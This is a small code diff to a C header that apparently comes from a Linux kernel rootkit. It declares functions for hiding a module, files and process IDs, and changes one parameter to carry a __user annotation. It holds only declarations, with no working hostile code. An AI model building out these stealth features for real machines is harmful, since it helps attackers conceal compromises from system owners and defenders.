@@ -8,7 +8,7 @@
 int is_module_hidden(void);
 int is_file_hidden(const char* name);
 int is_pid_hidden(int pid);
-int pathname_includes_pid(const char* pathname);
+int pathname_includes_pid(const char __user* pathname);
 
 int hide_module(void);
 int unhide_module(void);
